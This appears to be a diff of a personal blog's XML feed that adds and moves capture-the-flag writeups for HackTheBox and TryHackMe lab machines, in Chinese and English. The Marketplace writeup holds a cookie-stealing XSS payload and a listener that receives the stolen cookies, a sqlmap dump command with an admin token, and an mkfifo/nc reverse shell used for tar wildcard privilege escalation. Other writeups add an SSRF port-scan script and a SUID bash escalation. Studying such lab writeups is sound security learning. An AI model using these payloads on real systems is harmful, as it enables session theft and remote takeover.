form-data; name=&quot;bookurl&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;http://127.0.0.1:<span class="subst">&#123;i&#125;</span>/\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;bookfile&quot;; filename=&quot;&quot;\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Type: application/octet-stream\r\n\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">f&#x27;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        web = req.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> web.text != expected_response:</span><br><span class="line">            <span class="built_in">print</span>(web.text, <span class="string">f&#x27;port : <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> req.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Request failed for port <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="built_in">list</span>(tqdm(executor.<span class="built_in">map</span>(make_request, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65536</span>)), total=<span class="number">65535</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/SkVz94nrC.png" alt="image">  </p>
+<p>dump出這坨東西：  </p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;promotions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve a list of all the promotions in our library.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;coupons&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the list of coupons to use in our library.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;new_authors&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the welcome message sended to our new authors.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;platform_use&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve examples of how to use the platform.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;changelog&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve a list of all the versions and updates of the api.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/changelog&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;latest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the last version of api.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>其中<code>/api/latest/metadata/messages/authors</code>的path就可以拿到 ssh的帳密了  </p>
+<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="bash-suid"><a href="#bash-suid" class="headerlink" title="bash suid???"></a>bash suid???</h4><p><img src="https://hackmd.io/_uploads/Skfch4hBC.png" alt="image">  </p>
+<p><code>bash -p</code>結束這回合…</p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>水，撫慰今天apcs 觀念題繼續被炸爛的心情<br>要段考要資格考ㄌqwq<br>這個賽季應該只能 Silver了ㄅ，下季要努力打(如果沒有衝到其他事情)<br><img src="https://hackmd.io/_uploads/SyFVCNhHC.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>SSRF</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1786,6 +1731,39 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>The Marketplace CTF Writeup on TryHackMe</title>
+    <url>/2023/11/22/marketplacectf/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Coffee or tea or whale?<br>well…you can’t order the last one 🤣  </p>
+<p>Victim IP : 10.10.65.93<br>My IP : 10.8.211.34  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p>Nothing found but a port : 32768 with the same function as port : 80.  </p>
+<h3 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h3><p>This is a simple market website, you can register your account and add new items.  </p>
+<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>After I tried out the <code>add</code> function, I noticed that there’s a XSS vulnerabilities:<br><img src="https://hackmd.io/_uploads/S1kEuSjVp.png" alt="image"><br>Both of the alert worked, so it’s time to report the payload to admin.<br>Though there’s no webhook.site to use, it’s still feasible to set up a simple http server with python.<br><strong>Source:</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># POC for cookie stealing through XSS</span></span><br><span class="line"><span class="comment"># Should work with:</span></span><br><span class="line"><span class="comment"># &lt;script&gt;</span></span><br><span class="line"><span class="comment">#   image = new Image();</span></span><br><span class="line"><span class="comment">#   image.src=&#x27;http://X.X.X.X:8888/?&#x27;+document.cookie;</span></span><br><span class="line"><span class="comment"># &lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Written by Ahmed Shawky @lnxg33k</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        query_components = parse_qs(urlparse(self.path).query)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%s - %s\t%s&quot;</span> % (</span><br><span class="line">            datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %I:%M %p&quot;</span>),</span><br><span class="line">            self.client_address[<span class="number">0</span>],</span><br><span class="line">            self.headers[<span class="string">&#x27;user-agent&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------&quot;</span>*<span class="number">6</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> query_components.items():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;%s\t\t\t%s&quot;</span> % (k.strip(), v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print query_components</span></span><br><span class="line">        <span class="comment"># self.send_response(500)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)</span></span><br><span class="line">        <span class="comment"># self.end_headers()</span></span><br><span class="line">        <span class="comment"># self.wfile.write(c)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>), MyHandler)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Started http server&#x27;</span>)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;^C received, shutting down server&#x27;</span>)</span><br><span class="line">        server.socket.close()</span><br></pre></td></tr></table></figure>
+<p><strong>XSS Payload:</strong>  </p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> image = <span class="keyword">new</span> <span class="title class_">Image</span>(); image.<span class="property">src</span>=<span class="string">&#x27;http://10.8.211.34:8888/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rJc_KBiEp.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkvYYSiNa.png" alt="image">  </p>
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><p>After getting the admin’s cookie, I found out a sql injection in admin panel.<br><img src="https://hackmd.io/_uploads/S1UQcHsVp.png" alt="image">  </p>
+<p><strong>sqlmap:</strong><br><code>sqlmap --url &quot;http://10.10.65.93/admin?user=1&quot; --cookie=&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA2MjkxMDN9.Lj9L2zuNLSAQE3btbfm_XZTgbJHKRPH7HOWk-fSbgyE&#39; --technique=U --delay=2 --dump</code><br><img src="https://hackmd.io/_uploads/SJTecSiNa.png" alt="image">  </p>
+<p>And here’s the ssh password~  </p>
+<p><img src="https://hackmd.io/_uploads/SJOr9Ss46.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/r1gUcSoNT.png" alt="image">  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Wildcard-Injection"><a href="#Wildcard-Injection" class="headerlink" title="Wildcard Injection"></a>Wildcard Injection</h4><p>Here for more informations:<a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">link</a>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.211.34 5130 &gt;/tmp/f&#x27;</span>&gt;shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;<span class="string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;--checkpoint=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ry3esSs4a.png" alt="image">  </p>
+<p>Get shell on 5130:<br><img src="https://hackmd.io/_uploads/H1UEoBi46.png" alt="image"><br>Escalated to user <code>michael</code>.  </p>
+<h4 id="Docker-Escalation"><a href="#Docker-Escalation" class="headerlink" title="Docker Escalation"></a>Docker Escalation</h4><p><a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a><br><img src="https://hackmd.io/_uploads/rkvdsroE6.png" alt="image"><br>Get flag!!!<br><img src="https://hackmd.io/_uploads/HJfiiBjV6.png" alt="image">  </p>
+<h3 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h3><p>Just a little bit tire and nervous now &gt;&lt;.  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>XSS</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>SQL Injection</tag>
+        <tag>Wildcard Injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LoTuX CTF WriteUp-Web</title>
     <url>/2023/09/20/lotuxctf-web/</url>
     <content><![CDATA[<h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>I start my challenges on LoTuX CTF from May, and I’ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)<br><a href="http://lotuxctf.com:20003/4310.jpg">LoTuXCTF.com</a>  </p>
@@ -1870,39 +1848,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>loTuX CTF</tag>
         <tag>RCE</tag>
         <tag>backdoor</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>The Marketplace CTF Writeup on TryHackMe</title>
-    <url>/2023/11/22/marketplacectf/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Coffee or tea or whale?<br>well…you can’t order the last one 🤣  </p>
-<p>Victim IP : 10.10.65.93<br>My IP : 10.8.211.34  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><p>Nothing found but a port : 32768 with the same function as port : 80.  </p>
-<h3 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h3><p>This is a simple market website, you can register your account and add new items.  </p>
-<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>After I tried out the <code>add</code> function, I noticed that there’s a XSS vulnerabilities:<br><img src="https://hackmd.io/_uploads/S1kEuSjVp.png" alt="image"><br>Both of the alert worked, so it’s time to report the payload to admin.<br>Though there’s no webhook.site to use, it’s still feasible to set up a simple http server with python.<br><strong>Source:</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># POC for cookie stealing through XSS</span></span><br><span class="line"><span class="comment"># Should work with:</span></span><br><span class="line"><span class="comment"># &lt;script&gt;</span></span><br><span class="line"><span class="comment">#   image = new Image();</span></span><br><span class="line"><span class="comment">#   image.src=&#x27;http://X.X.X.X:8888/?&#x27;+document.cookie;</span></span><br><span class="line"><span class="comment"># &lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Written by Ahmed Shawky @lnxg33k</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        query_components = parse_qs(urlparse(self.path).query)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;%s - %s\t%s&quot;</span> % (</span><br><span class="line">            datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %I:%M %p&quot;</span>),</span><br><span class="line">            self.client_address[<span class="number">0</span>],</span><br><span class="line">            self.headers[<span class="string">&#x27;user-agent&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;-------------------&quot;</span>*<span class="number">6</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> query_components.items():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;%s\t\t\t%s&quot;</span> % (k.strip(), v)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print query_components</span></span><br><span class="line">        <span class="comment"># self.send_response(500)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;)</span></span><br><span class="line">        <span class="comment"># self.end_headers()</span></span><br><span class="line">        <span class="comment"># self.wfile.write(c)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">log_message</span>(<span class="params">self, <span class="built_in">format</span>, *args</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>), MyHandler)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Started http server&#x27;</span>)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;^C received, shutting down server&#x27;</span>)</span><br><span class="line">        server.socket.close()</span><br></pre></td></tr></table></figure>
-<p><strong>XSS Payload:</strong>  </p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> image = <span class="keyword">new</span> <span class="title class_">Image</span>(); image.<span class="property">src</span>=<span class="string">&#x27;http://10.8.211.34:8888/?&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJc_KBiEp.png" alt="image"><br><img src="https://hackmd.io/_uploads/BkvYYSiNa.png" alt="image">  </p>
-<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><p>After getting the admin’s cookie, I found out a sql injection in admin panel.<br><img src="https://hackmd.io/_uploads/S1UQcHsVp.png" alt="image">  </p>
-<p><strong>sqlmap:</strong><br><code>sqlmap --url &quot;http://10.10.65.93/admin?user=1&quot; --cookie=&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDA2MjkxMDN9.Lj9L2zuNLSAQE3btbfm_XZTgbJHKRPH7HOWk-fSbgyE&#39; --technique=U --delay=2 --dump</code><br><img src="https://hackmd.io/_uploads/SJTecSiNa.png" alt="image">  </p>
-<p>And here’s the ssh password~  </p>
-<p><img src="https://hackmd.io/_uploads/SJOr9Ss46.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/r1gUcSoNT.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Wildcard-Injection"><a href="#Wildcard-Injection" class="headerlink" title="Wildcard Injection"></a>Wildcard Injection</h4><p>Here for more informations:<a href="https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c">link</a>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.211.34 5130 &gt;/tmp/f&#x27;</span>&gt;shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;<span class="string">&#x27;--checkpoint-action=exec=sh shell.sh&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span>&gt;--checkpoint=1</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/ry3esSs4a.png" alt="image">  </p>
-<p>Get shell on 5130:<br><img src="https://hackmd.io/_uploads/H1UEoBi46.png" alt="image"><br>Escalated to user <code>michael</code>.  </p>
-<h4 id="Docker-Escalation"><a href="#Docker-Escalation" class="headerlink" title="Docker Escalation"></a>Docker Escalation</h4><p><a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a><br><img src="https://hackmd.io/_uploads/rkvdsroE6.png" alt="image"><br>Get flag!!!<br><img src="https://hackmd.io/_uploads/HJfiiBjV6.png" alt="image">  </p>
-<h3 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h3><p>Just a little bit tire and nervous now &gt;&lt;.  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>XSS</tag>
-        <tag>SQL Injection</tag>
-        <tag>Wildcard Injection</tag>
       </tags>
   </entry>
   <entry>
@@ -2490,11 +2435,11 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>晚安世界 &gt;w&lt;</p>
 ]]></content>
       <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>AD</tag>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
         <tag>BloodHound</tag>
         <tag>getST</tag>
         <tag>crackmapexec</tag>
@@ -2525,9 +2470,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>第一次玩JuicyPotato，有趣XD  </p>
 ]]></content>
       <tags>
+        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Windows</tag>
         <tag>JuicyPotato</tag>
       </tags>
   </entry>
@@ -2838,11 +2783,11 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>成功Admin後我才回去找flag…<br>我疑似有跳步驟(?)<br>上網找了一下別人打法應該要先拿admcrocccrew就是，但我拿不到他的SPN RRR<br>最後，我<code>net user Administrator Whale120</code>改掉密碼後，跑去RDP <del>搞怪</del><br><img src="https://hackmd.io/_uploads/ry3DDTxu0.png" alt="image"><br>hehe，開心，感覺自己真的比較熟一點點ADㄌ  </p>
 ]]></content>
       <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>AD</tag>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -2890,100 +2835,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>TryHackMe</tag>
         <tag>lxd</tag>
         <tag>routingtableparser</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnNet:Roasted on Tryhackme</title>
-    <url>/2024/03/05/vulnet-rst/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>第二次打AD，好玩ww  </p>
-<p>Victim’s IP : 10.10.225.254<br>Victim’s Host : vulnnet-rst.local<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.225.254 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/S1DuOiEa6.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/Sk99_sEa6.png" alt="image">  </p>
-<p>基本上就是一般架構，port 88有Kerberos，port 445是smb。  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h4><p><strong>Command</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.225.254 -N</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rykmYjEpp.png" alt="image">  </p>
-<p><strong>Result</strong><br>用Anonymous連進去後就是一堆奇怪(?)的文檔，基本上沒有功能。  </p>
-<p><img src="https://hackmd.io/_uploads/SkPIKsN6p.png" alt="image">  </p>
-<h4 id="smb-rid-enumeration"><a href="#smb-rid-enumeration" class="headerlink" title="smb rid enumeration"></a>smb rid enumeration</h4><p>透過<code>crackmapexec</code>進行smb rid enumeration找出Host, Group, User等相關資訊。<br><strong>Command</strong>  </p>
